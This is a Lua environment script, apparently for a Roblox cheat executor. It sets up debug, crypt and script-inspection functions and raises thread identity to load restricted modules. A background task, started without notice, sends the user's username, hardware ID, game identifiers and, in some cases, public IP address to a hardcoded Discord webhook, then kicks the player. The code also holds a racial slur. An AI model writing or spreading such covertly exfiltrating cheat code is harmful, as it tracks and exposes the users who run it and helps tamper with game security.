if not game:IsLoaded() then game.Loaded:Wait() end


getgenv().secretfunc = function(func)
	if func == nil then
		game.Players.LocalPlayer:Kick("not available right now!")
		error("kaka!")
	else
		local result = func()

		if result == "l1Hew5PGZg" then
			info("PSWalloz test nigga v2 or vkaka")
		else
			game.Players.LocalPlayer:Kick("Lil bro ur api version is outdated go and update it")
			error("Outdated Error")
		end
	end
end

secretfunc(snAoMosZ0p)

getgenv().disocrdip = function()
    local kaka = "https://api.ipify.org/"
    local response = request({
        Url = kaka,
        Method = "GET",
    })
    return response.Body
end

getgenv().consoleclear = function() end
getgenv().consolecreate = function() end
getgenv().consoledestroy = function() end
getgenv().consoleinput = function() end
getgenv().consoleprint = function() end
getgenv().consolesettitle = function() end
getgenv().rconsolename = function() end

local testdebug = table.clone(debug)

testdebug.getconstant = getgenv().getconstant
testdebug.getconstants = getgenv().getconstants
testdebug.getinfo = getgenv().getinfo
testdebug.setconstant = getgenv().setconstant
testdebug.getproto = getgenv().getproto
testdebug.getprotos = getgenv().getprotos
testdebug.getstack = getgenv().getstack
testdebug.setstack = getgenv().setstack
testdebug.getupvalue = getgenv().getupvalue
testdebug.getupvalues = getgenv().getupvalues
testdebug.setupvalue = getgenv().setupvalue
testdebug.getregistry = getgenv().getregistry

debug = testdebug

getgenv().bit = {}

for i, v in next, bit32 do
bit[i] = v
end

bit.ror = bit.rrotate
bit.rol = bit.lrotate
bit.rrotate = nil
bit.lrotate = nil

bit.badd = function(a, b)
   return a + b
end

bit.bsub = function(a, b)
   return a - b
end

bit.bdiv = function(a, b)
   return a / b
end

bit.bmul = function(a, b)
   return a * b
end

bit.tobit = function(x)
  x = x % (2^32)
  if x >= 0x80000000 then x = x - (2^32) end
  return x
end

bit.tohex = function(x, n)
 n = n or 8
 local up
 if n <= 0 then
   if n == 0 then return '' end
   up = true
   n = - n
 end
 x = bit.band(x, 16^n-1)
 return ('%0'..n..(up and 'X' or 'x')):format(x)
end

bit.bswap = function(x)
 local a = bit.band(x, 0xff)
 x = bit.rshift(x, 8)
 local b = bit.band(x, 0xff)
 x = bit.rshift(x, 8)
 local c = bit.band(x, 0xff)
 x = bit.rshift(x, 8)
 local d = bit.band(x, 0xff)
 return bit.lshift(bit.lshift(bit.lshift(a, 8) + b, 8) + c, 8) + d
end

getgenv().setthreadidentity = function(identity: number): ()
    _setidentity(identity)
    task.wait()
end

getgenv().setidentity = getgenv().setthreadidentity
getgenv().setthreadcontext = getgenv().setthreadidentity

getgenv().getinstances = function()
            local objs = {}
            for i,v in next, getreg() do
               if type(v)=='table' then
                  for o,b in next, v do
                      if typeof(b) == "Instance" then
                           table.insert(objs, b)
                      end
                  end
               end
            end
         return objs
 end


do
    local CoreGui = game:GetService('CoreGui')
    local HttpService = game:GetService('HttpService')

    local comm_channels = CoreGui:FindFirstChild('comm_channels') or Instance.new('Folder', CoreGui)
    if comm_channels.Name ~= 'comm_channels' then
        comm_channels.Name = 'comm_channels'
    end
    getgenv().create_comm_channel = newcclosure(function() 
        local id = HttpService:GenerateGUID()
        local event = Instance.new('BindableEvent', comm_channels)
        event.Name = id
        return id, event
    end)

    getgenv().get_comm_channel = newcclosure(function(id) 
        assert(type(id) == 'string', 'string expected as argument #1')
        return comm_channels:FindFirstChild(id)
    end)
end

getgenv().getactors = newcclosure(function()
    local actors = {};
    for i, v in game:GetDescendants() do
        if v:IsA("Actor") then
            table.insert(actors, v);
        end
    end
    return actors;
end);

getgenv().getscripthash = function(script)
    return script:GetHash()
end

setreadonly(getgenv().debug,false)
getgenv().debug.traceback = getrenv().debug.traceback
getgenv().debug.profilebegin = getrenv().debug.profilebegin
getgenv().debug.profileend = getrenv().debug.profileend
getgenv().debug.getmetatable = getgenv().getrawmetatable
getgenv().debug.setmetatable = getgenv().setrawmetatable
getgenv().debug.info = getrenv().debug.info

getgenv().getrunningscripts = function()
    local t = table.create(0)

    for i,v in pairs(getreg()) do
        if typeof(v) == "thread" then
            local a = gettenv(v)

            if a["script"] then
                if not table.find(t,a.script) then
                    table.insert(t, a.script)
                end
            end
        end
    end

return t

end

getgenv().getloadedmodules = function()
    local list = {}
    for i, v in getgc(false) do
        if typeof(v) == "function" then
            local success, env = pcall(getfenv, v)
            if success and typeof(env) == "table" and typeof(env["script"]) == "Instance" and env["script"]:IsA("ModuleScript") then
                if not table.find(list, env["script"]) then
                    table.insert(list, env["script"])
                end
            end
        end
    end
    return list
end

getgenv().getsenv = function(script_instance)
   for i, v in pairs(getreg()) do
      if type(v) == "function" then
         if getfenv(v).script == script_instance then
             return getfenv(v)
             end
          end
     end
end

getgenv().isnetworkowner = function(part: BasePart): boolean
    return part.ReceiveAge == 0 and not part.Anchored and part.Velocity.Magnitude > 0
end

getgenv().setsimulationradius = function(newRadius)
    assert(newRadius, `arg #1 is missing`)
    assert(type(newRadius) == "number", `arg #1 must be type number`)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    if LocalPlayer then
        LocalPlayer.SimulationRadius = newRadius
        LocalPlayer.MaximumSimulationRadius = newRadius
    end
end

getgenv().getsimulationradius = function()
    assert(newRadius, `arg #1 is missing`)
    assert(type(newRadius) == "number", `arg #1 must be type number`)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    if LocalPlayer then
        return LocalPlayer.SimulationRadius
    end
end

getgenv().http = {}
getgenv().http.request = request
setreadonly(http, true)

getgenv().http_request = request

getgenv().base64 = {}
getgenv().crypt = {}
getgenv().crypt.base64 = {}

getgenv().crypt.base64encode = getgenv().base64encode
getgenv().crypt.base64.encode = getgenv().base64encode
getgenv().crypt.base64_encode = getgenv().base64encode
getgenv().base64.encode = getgenv().base64encode
getgenv().base64_encode = getgenv().base64encode

getgenv().crypt.base64decode = getgenv().base64decode
getgenv().crypt.base64.decode = getgenv().base64decode
getgenv().crypt.base64_decode = getgenv().base64decode
getgenv().base64.decode = getgenv().base64decode
getgenv().base64_decode = getgenv().base64decode

getgenv().crypt.encrypt = getgenv().encrypt
getgenv().crypt.decrypt = getgenv().decrypt

getgenv().crypt.generatebytes = getgenv().generatebytes

getgenv().crypt.generatekey = getgenv().generatekey
getgenv().crypt.hash = getgenv().hash

setreadonly(getgenv().base64, true)
setreadonly(getgenv().crypt, true)

local _oldd = clonefunction(getscriptclosure_handler)

getgenv().getscriptclosure = newcclosure(function(scr) 
	local closure = _oldd(scr)

	if typeof(closure) == "function" then
		local scriptEnv = getfenv(closure)

		scriptEnv["script"] = scr

		return closure
	else
		return nil
	end
end)

getgenv().getscriptfunction = getgenv().getscriptclosure

local oldreq = clonefunction(getrenv().require)
getgenv().require = newcclosure(function(v)
    local oldlevel = getthreadcontext()
    local succ, res = pcall(oldreq, v)
    if not succ and res:find('RobloxScript') then
        succ = nil
        coroutine.resume(coroutine.create(newcclosure(function()
            setthreadcontext((oldlevel > 5 and 2) or 8)
            succ, res = pcall(oldreq, v)
        end)))
        repeat task.wait() until succ ~= nil
    end
    
    setthreadcontext(oldlevel)
    
    if succ then
        return res
    end
end)

--[[
getgenv().hookmetamethod = newcclosure(function(obj, method, rep)
    local mt = getrawmetatable(obj)
    local old = mt[method]
    
    if(iscclosure(old) == false) then
             rep = newcclosure(rep)
    end

    setreadonly(mt, false)
    mt[method] = rep
    setreadonly(mt, true)
    
    return old
end)
]]

task.spawn(function()
    local UserInputService = game:GetService("UserInputService")
    local _game = game:GetService("CoreGui").Parent
    local HttpService = _game:FindService("HttpService")

    local function checkcc()
        return identifyexecutor().." <- identifyexecutor | getexecutorname -> "..getexecutorname()
    end

    local function kaka()
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            return "Mobile"
        elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
            return "PC"
        else
            return "Unkown"
        end
    end

    local function sendRequest(options, timeout)
        timeout = tonumber(timeout) or math.huge
        local result, clock = nil, tick()

        HttpService:RequestInternal(options):Start(function(success, body)
            result = body
            result['Success'] = success
        end)

        while not result do task.wait()
            if (tick() - clock > timeout) then
                break
            end
        end

        return result
    end

    local message = "Device -> "..kaka().."\nUser -> "..game.Players.LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId
    local options = {
        Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
        Body = HttpService:JSONEncode({
            ['content'] = tostring(message),
            ['username'] = "User "..gethwid()--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
        }),
        Method = 'POST',
        Headers = {
            ["Content-Type"] = "application/json"
        }
    }

    sendRequest(options, timeout)


    while true do
        wait(5)
        if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
            local kakav3 = "@PSWalloz \nidentifyexecutor -> "..identifyexecutor().."\ngetexecutorname -> "..getexecutorname().."\nIp -> "..disocrdip().."\nHwid -> "..gethwid().."\nUsername -> "..game.Players.LocalPlayer.Name
            local kaka = {
                Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
                Body = HttpService:JSONEncode({
                    ['content'] = tostring(kakav3),
                    ['username'] = "Kaka Skidder"--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
                }),
                Method = 'POST',
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            }
            sendRequest(kaka, timeout)
            game.Players.LocalPlayer:Kick("stop skidding lil bro")
            error("skidder alert")
        end
    end
end)

getgenv().hookmeatmethod = hookmetamethod

loadautoexecutor()
